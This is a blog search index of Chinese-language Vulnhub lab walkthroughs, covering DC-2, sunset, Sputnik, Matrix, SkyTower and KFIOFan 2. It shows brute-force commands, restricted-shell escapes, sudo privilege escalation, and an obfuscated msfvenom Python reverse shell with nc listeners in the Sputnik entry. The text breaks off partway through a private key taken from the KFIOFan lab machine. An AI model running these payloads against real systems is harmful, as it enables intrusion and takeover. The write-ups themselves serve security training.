<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC: 2</title>
      <link href="/articles/965feb23.html"/>
      <url>/articles/965feb23.html</url>
      
        <content type="html"><![CDATA[<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC: 2"></a>DC: 2</h2><blockquote><p><a href="https://www.vulnhub.com/entry/dc-2,311/">靶机地址</a></p></blockquote><p>Nmap 扫描结果如下，不过 80 端口应该是需要根据主机名解析，所以编辑 <code>/etc/hosts</code> （Windows 下为 <code>C:\Windows\System32\drivers\etc\hosts</code> ）文件再扫一次</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511200642.png"></p><p>第二次扫描结果如下，是 WordPress，那就直接用 wpscan 扫一下吧</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511201007.png"></p><p>访问网站发现 flag1，给出了提示，需要用户登录和爆破，字典工具 cewl</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514161224.png"></p><p>扫出来仨用户名，准备爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/  --enumerate p --enumerate t --enumerate u</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514152824.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;admin\ntom\njerry\n&quot;</span> &gt; user.txt <span class="comment"># 写入用户名</span></span><br><span class="line">cewl http://dc-2/ &gt; passwd.txt <span class="comment"># 生成字典</span></span><br><span class="line">wpscan --url http://dc-2/ -U user.txt -P passwd.txt</span><br></pre></td></tr></table></figure><p>![](<a href="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted">https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted</a> image 20250514153947.png)</p><blockquote><p><code>jerry/adipiscing</code><br><code>tom/parturient</code></p></blockquote><p>Dirsearch 扫出来了一些目录，用爆破出来的用户名密码登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514161546.png"></p><p>登录以后，拿到 <a href="http://dc-2/wp-admin/post.php?post=21&action=edit">flag2</a> ，提示从另一个切入点进行攻击，应该是从那个非常规的 ssh 端口进行攻击</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514180813.png"></p><p>Jerry 的账号密码无法登陆，tom 的成功登录进去了，但是是一个受限的 shell，不过看到目录下有一个 vi 命令，那么就能够通过 vi 绕过受限 shell</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514184716.png"></p><p>绕过受限 shell 以后，导出环境变量以后就能正常执行命令了并且拿到了 flag3，这个同样应该也是一个提示，然后发现 tom 没有 sudo 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功绕过以后，导出环境变量</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash:<span class="variable">$SHELL</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514190359.png"></p><p>查看 <code>/etc/passwd</code> 发现有一个 jerry 用户，且 shell 环境是 <code>/bin/bash</code>，尝试 <code>su jerry</code> ，成功通过之前爆破出来的密码登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514190805.png"></p><p>然后通过 git 提权，拿到最后的 flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514185345.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sunset: 1</title>
      <link href="/articles/c581b7b5.html"/>
      <url>/articles/c581b7b5.html</url>
      
        <content type="html"><![CDATA[<h2 id="sunset-1"><a href="#sunset-1" class="headerlink" title="sunset: 1"></a>sunset: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/sunset-1,339/">靶机地址</a></p></blockquote><p>Nmap 扫出来一个可以匿名登录的 ftp 端口</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250514232913.png"></p><p>然后发现一个 <code>backup</code> 文件，里边存储了用户名和哈希值，下载下来使用 john 爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREDENTIALS:                                     </span><br><span class="line">office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.</span><br><span class="line">datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/</span><br><span class="line">sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0</span><br><span class="line">sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/</span><br><span class="line">space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/</span><br></pre></td></tr></table></figure><p>爆破出来三个密码：<code>space/space</code>、<code>sunset/cheer14</code>、<code>sky/sky</code>，然后尝试 ssh 登录</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515004131.png"></p><p><code>space</code> 和 <code>sky</code> 无法登录，但是 <code>sunset</code> 可以，登录之后发现当前目录下有一个 <code>user.txt</code>，里边存放的是 <code>sunset</code> 的 md5 值</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515005450.png"></p><p>然后发现可以直接提权，提权之后在 <code>/root</code> 目录下拿到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> ed</span><br><span class="line">!/bin/bash</span><br><span class="line"><span class="built_in">ls</span> ~</span><br><span class="line"><span class="built_in">cat</span> ~/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250515005616.png"></p><blockquote><p><code>25d7ce0ee3cbf71efbac61f85d0c14fe</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sputnik: 1</title>
      <link href="/articles/1ac0b2ee.html"/>
      <url>/articles/1ac0b2ee.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sputnik-1"><a href="#Sputnik-1" class="headerlink" title="Sputnik: 1"></a>Sputnik: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/sputnik-1,301/">靶机地址</a></p></blockquote><p>Nmap 扫出来有三个开放端口，三个 http 服务，其中一个是 api，一个存在 git 泄露，一个是登录界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.234.1/24</span><br><span class="line">nmap -sT --min-rate 1000 -p- 192.168.234.151 -oN ports</span><br><span class="line">ports=$(grep open ports|awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|<span class="built_in">paste</span> -sd <span class="string">&#x27;,&#x27;</span>);nmap -sT -sV -sC -O -p <span class="variable">$ports</span> 192.168.234.151 -oN detail</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510114538.png"></p><p>直接上 GitHacker，但是这个下边的 <code>.git</code> 文件夹的目录结构不完整，所以 clone 不下来，不过访问 <code>http://192.168.234.151:55555/.git/logs/HEAD</code> 发现是 clone 自 <code>https://github.com/ameerpornillos/flappy.git</code> 这个 Github 项目 </p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510224850.png"></p><p>然后在 commit 里找到一个 <code>secret</code> 文件并且在这个 Update commit 之后就 delete 了，这个应该是用户名密码，而 61337 端口正好是一个 splunk 登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510225405.png"></p><blockquote><p><code>sputnik:ameer_says_thank_you_and_good_job</code></p></blockquote><p>Splunk 的版本是 7.2.5，在 Github 找到一个 <a href="https://github.com/TBGSecurity/splunk_shells">splunk_shells</a> 可以在拿到 splunk 面板权限以后反弹 shell，在管理应用板块上传 <a href="https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz">splunk_shells-1.2.tar.gz</a>，然后重启 splunk，更改 splunk_shells 权限</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511104043.png"></p><p>然后回到搜索板块，先在我们的 vps 上进行监听，然后再在搜索框反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9099</span><br><span class="line"></span><br><span class="line">|revshell std 192.168.234.129 9099</span><br></pre></td></tr></table></figure><p>能够看到是一个普通用户 <code>splunk</code> 且不是一个可交互式 shell，所以还需要通过 msf 进一步利用，用 msf 生成了一个反弹 shell 的 payload，然后二次反弹之后，成功获取 TTY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.234.129 lport=9090 R</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;exec(__import__(&#x27;zlib&#x27;).decompress(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;eNqNkMEKwjAMhl9l7NSCdGsVsUgPQyaIqOB2H65WNpzLWLr3l9qBPS6HhCRf/h/SfgYYbYSg38ZGLla/jFM9jKANYjAEjPauNoBWxVwKxrc7JtYbxoWM/c7JKZnK1LeovDTzhcxddqxO17wMDf2iuB3OVVHe8+xCZwWmoe+NtoQ43+DEWdGZAmTPaRAE2avtTA+EBmC6BOJLIDFDg/o/iOlH15E4qds+wSamX9P2WVQ=&#x27;)[0])))&quot;</span> <span class="comment"># 这个是在之前监听 9099 端口的 shell 中执行</span></span><br><span class="line"></span><br><span class="line">nc -lnvp 9090</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511105518.png"></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511105610.png"></p><p>执行 <code>sudo -l</code> 需要输入密码，尝试之前拿到的密码 <code>ameer_says_thank_you_and_good_job</code> 执行成功，然后发现有一个 root 权限的 <code>ed</code> 命令，那么就直接提权，然后在 <code>/root</code> 目录下找到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">ameer_says_thank_you_and_good_job</span><br><span class="line"><span class="built_in">sudo</span> ed</span><br><span class="line">!/bin/bash</span><br><span class="line"><span class="built_in">ls</span> ~</span><br><span class="line"><span class="built_in">cat</span> ~/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250511111031.png"></p><blockquote><p><code>flag_is&#123;w1th_gr34t_p0w3r_c0m35_w1th_gr34t_r3sp0ns1b1l1ty&#125;</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matrix: 1</title>
      <link href="/articles/5c57d1b8.html"/>
      <url>/articles/5c57d1b8.html</url>
      
        <content type="html"><![CDATA[<h2 id="Matrix-1"><a href="#Matrix-1" class="headerlink" title="Matrix: 1"></a>Matrix: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/matrix-1,259/">靶机地址</a></p></blockquote><p>Nmap 扫出来三个端口——&gt;22、80、31337。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250509002947.png"></p><p>用 dirsearch 扫了一下两个端口，没什么东西，但是在 31337 端口的 web 页面注释里发现了一串 base 64：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</span><br><span class="line"></span><br><span class="line">echo &quot;Then you&#x27;ll see, that it is not the spoon that bends, it is only yourself. &quot; &gt; Cypher.matrix</span><br></pre></td></tr></table></figure><p>下载 <code>Cypher.matrix</code> 发现是 brainfuck</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250509004219.png"></p><p>解密之后的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You can enter into matrix as guest, with password k1ll0rXX</span><br><span class="line">Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.</span><br><span class="line"></span><br><span class="line">您可以以访客身份进入矩阵，密码为 k1ll0rXX</span><br><span class="line">注意：实际上，我忘记了最后两个字符，所以我用 XX 替换了，试试运气，找到正确的密码字符串。</span><br></pre></td></tr></table></figure><p>因为网页上没有登录口，那应该是让我们爆破 ssh，用 Python 脚本生成一个字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">prefix = <span class="string">&quot;k1ll0r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;wordlist.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(charset,repeat=<span class="number">2</span>):</span><br><span class="line">        password = prefix + <span class="string">&#x27;&#x27;</span>.join(c) </span><br><span class="line">        file.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后用以下命令进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l guest -P wordlist.txt ssh://192.168.234.150 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250509214053.png"></p><p>爆破出来密码为 <code>k1ll0r7n</code>，ssh 连接上后发现是一个受限的 rbash，连 <code>ls</code> 都执行不了。不过看到目录下有一个 vi，那就可以绕过限制</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250509220123.png"></p><p>通过 <code>vi</code> 逃逸，然后在当前 shell 更新 shell 和环境变量，这样就可以正常执行命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash</span><br><span class="line"></span><br><span class="line">export SHELL=/bin/bash:$SHELL</span><br><span class="line">export PATH=/usr/bin:$PATH</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510110617.png"></p><p>然后准备提权，发现可以直接获得 root shell，不过 <code>/bin</code> 目录之前没有添加到环境变量中，所以执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> /bin/su</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510111554.png"></p><p>然后在 <code>/root</code> 目录下拿到 flag</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250510111813.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SkyTower: 1</title>
      <link href="/articles/382ba87d.html"/>
      <url>/articles/382ba87d.html</url>
      
        <content type="html"><![CDATA[<h2 id="SkyTower-1"><a href="#SkyTower-1" class="headerlink" title="SkyTower: 1"></a>SkyTower: 1</h2><blockquote><p><a href="https://www.vulnhub.com/entry/skytower-1,96/">靶机地址</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215916240.png" alt="image-20250505215916240"></p><p>80 是一个登录界面，存在 SQL 注入，万能密码直接登录进去了</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215922390.png" alt="image-20250505215922390"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Welcome john@skytech.com</span><br><span class="line"></span><br><span class="line">As you may know, SkyTech has ceased all international operations.</span><br><span class="line"></span><br><span class="line">To all our long term employees, we wish to convey our thanks for your dedication and hard work.</span><br><span class="line"></span><br><span class="line">Unfortunately, all international contracts, including yours have been terminated.</span><br><span class="line"></span><br><span class="line">The remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.</span><br><span class="line"></span><br><span class="line">Username: john</span><br><span class="line">Password: hereisjohn</span><br><span class="line"></span><br><span class="line">We wish you the best of luck in your future endeavors.</span><br><span class="line"></span><br><span class="line">欢迎访问 john@skytech.com</span><br><span class="line"></span><br><span class="line">您可能已经知道，SkyTech 已停止所有国际业务。</span><br><span class="line"></span><br><span class="line">我们衷心感谢所有长期员工的奉献和辛勤工作。</span><br><span class="line"></span><br><span class="line">很遗憾，所有国际合同，包括您的合同，均已终止。</span><br><span class="line"></span><br><span class="line">您的合同余额和退休金（2 美元）已全额支付至一个安全账户。出于安全考虑，您必须通过 SSH 登录 SkyTech 服务器才能访问账户详情。</span><br><span class="line"></span><br><span class="line">用户名：john</span><br><span class="line">密码：hereisjohn</span><br><span class="line"></span><br><span class="line">祝您未来一切顺利。</span><br></pre></td></tr></table></figure><p>下一步就是通过 ssh 登录上服务器了，但是刚刚并没有扫出来开放了 22 端口，不过有一个代理的 3128 端口，直接通过 proxytunnel 会返回 403，所以尝试在后边跟随命令，输入 john 密码，成功拿到 shell</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250503211439.png"></p><p>尝试使用 <code>mount</code> 提权，但一直提示不是一个可交互的终端，<code>script</code> 应该也被改过，<code>perl</code> 也打不开一个交互式的终端，继续不下去了，查看 wp 发现是因为是 <code>.bashrc</code> 的原因，导致了这个终端存在问题，而应该也和我使用的代理有关，删掉了 <code>.bashrc</code> 再次重新连接也还是不行，更换成 <code>proxychains</code> 就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215934504.png" alt="image-20250505215934504"></p><p>然后在网站目录下拿到了 mysql 数据库的密码，并成功连接</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215934504.png"></p><p>查出来三个邮箱和密码，而这三个都是系统用户，经试验第二个能登录，第三个不能</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215948122.png" alt="image-20250505215948122"></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250503220520.png"></p><p>直接使用 <code>sara/ihatethisjob</code> 登录，也是无法登录的，仍然需要删除目录下的 <code>.bashrc</code> 文件才行，重复之前的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh sara@192.168.234.148 /bin/bash <span class="comment"># 然后输入密码</span></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">rm</span> .bashrc</span><br><span class="line"><span class="comment"># 退出然后重新连接</span></span><br><span class="line">proxychains ssh sara@192.168.234.148</span><br></pre></td></tr></table></figure><p>没有可以直接能提权的命令，但是发现了两个高权限的命令 <code>ls</code> 和 <code>cat</code></p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215959099.png" alt="image-20250505215959099"></p><p>在 <code>/root</code> 目录下成功拿到 flag 和 root 密码</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/Pasted%20image%2020250503221308.png"></p><blockquote><p><code>root/theskytower</code></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF KFIOFan: 2</title>
      <link href="/articles/e1d41399.html"/>
      <url>/articles/e1d41399.html</url>
      
        <content type="html"><![CDATA[<h2 id="CTF-KFIOFan-2"><a href="#CTF-KFIOFan-2" class="headerlink" title="CTF KFIOFan: 2"></a>CTF KFIOFan: 2</h2><blockquote><p><a href="https://www.vulnhub.com/entry/ctf-kfiofan-2,325/">靶机地址</a></p></blockquote><p>Nmap 扫出来一个 ftp 匿名服务，但是只有四张图片。</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215712112.png" alt="image-20250505215712112"></p><p>下载到本地，然后拼接反色之后明显可以看出中间隐藏了一个 <code>cle.txt</code> 这个应该就是解决问题关键</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215718086.png" alt="image-20250505215718086"></p><p>不过靶机上没有这个文件，那就上传一个，上传了一个为空的文件之后，再次扫描发现新开放了一个 apache 端口</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215724083.png" alt="image-20250505215724083"></p><p>访问之后回显如下，查看源代码发现了 hint，然后扫出来一个 <code>uploads</code> 目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Tout ce qui est, est père du mensonge et fils du néant</span><br><span class="line">一切存在，皆为谎言之父，虚无之子。</span><br><span class="line"></span><br><span class="line">hint：</span><br><span class="line">Test présence fichier cle.txt : OK</span><br><span class="line">Test contenu fichier cle.txt : Erreur</span><br><span class="line">  </span><br><span class="line">测试 cle.txt 文件是否存在：OK</span><br><span class="line">测试 cle.txt 文件的内容：错误</span><br></pre></td></tr></table></figure><p>搜索这句话发现了一个<a href="https://blog.chaosklub.com/post/2005/09/29/256-farbauti-ibn-oblivion">网页</a>，是一句翻译其昵称的话，所以文件内容应该是其昵称</p><p><img src="https://cdn.jsdelivr.net/gh/cooorgi/img@main/img/image-20250505215730339.png" alt="image-20250505215730339"></p><blockquote><p><code>Khaos Farbauti Ibn Oblivion</code></p></blockquote><p>然后重新上传 <code>cle.txt</code> ，再次访问 26980 端口网页，正常了。是一个上传界面，<code>.htaccess</code> 绕过，然后连接蚁剑，在 <code>/var/www</code> 目录下发现了一个 ssh 私钥，虚拟终端无法反弹 shell，再次扫描发现了一个 ssh 端口（<code>26922</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAt0uRFvl8Jw8F+SNXh+cqN2m5aCxF5nuNmIqJVbYAi4gx7yib</span><br><span class="line">agK6ydH4XDGBO+oxoxuEYBqDaqDf8DWJGrKu20ossH1dmEEKEY35nIxb23TyoYia</span><br><span class="line">UaL9koSnt3oYQgpVP3lCp8QHIOKvkQPEnu8zbgIupNFHA6NoXZ+f0T6GNOWGGUSi</span><br><span class="line">3xRW/SeOVSpYi8UHdHbgwDId72XK5tbNhFIe2pcF3WO568+q52+MXmNx9XqUqOjI</span><br><span class="line">PH2wYz5tecAwwzoOySuUCjeglZZG8FD3Q1XayaRPjmw86GnkhrnARkkOkKLImw0D</span><br><span class="line">La2jguctJlm6xfqL+m3sZEsdFnRZjmf6sSgruQIDAQABAoIBAEo/RvdqefsMX9wK</span><br><span class="line">j+NSJUyq+9qRzILPW40F2RmqDtB2i9uXtFSd5HHqJtOZjgLqG885T0bqln8zyWJx</span><br><span class="line">HSd+Z8wWYMHhFm+dMOnpe8oJJRBhcAM05WXaQyL9rz5oK7lcnCmJAhIZGtYcXQe9</span><br><span class="line">4gCLXmbaZXCIAV8c6yK5jTBiRlTYUPsFDDc9S2vYucEronMATejBECLKENSk0X8j</span><br><span class="line">UZZNLs8snSHFgjV5iNgXDooDAYDC2yuxtcstAu+JPZrEW8906Du2KXVeH7Dga7lM</span><br><span class="line">bSbYnDgkDpmL0kuG23iNDRvvNr8UjDb7jfFi6kV8AwDO3ie+IjQ1BDybv5lMk5V2</span><br><span class="line">eus3KLECgYEA4Nn2p0J/MG/Wecqd95eVzdZBSuBzdBvoLh73nTT8UKZfhLGUXc2M</span><br><span class="line">ftTk+Mot6JtWgKYDz2i3AEzNSUHV3fkKMU7bqmVPDQEBVUWccEp+fH9XxXDNVKoy</span><br><span class="line">3eDnkm94oR1kUrW+2a/H7XT4rswTyUWyCoY+GBUjDDc/wkBAlwn1giUCgYEA0K/e</span><br><span class="line">yyu0AyjrTxiedDIYv1mxsgimTGofO3sER4Zhlqe/sY6vms8uLPkOGsvYdt5CjTPi</span><br><span class="line">JsTXL7iDx9N9mXyF1Apq3S4RniFQjsmSZTVTgWxO4qUQ69E8Hh2TZ5VLbjp7GDdB</span><br><span class="line">jxz5YIi1AVu2GFGsq7734mlKOGsjJcFe/5QBzQUCgYB7nnnkBUQmHiadeQ8WM4nR</span><br><span class="line">y+zDvNjcygcBbFcYYCwkLwQu0O7QD5Uhmex097r7uoN5YUyQ+HI8QP1QPFjXm/bF</span><br><span class="line">myRb7yzh6l6QQiA7AEnAKsbXryfEV3p10BOgx5ZbhexFKNTPm7vgSkH64Ao0yxOS</span><br><span 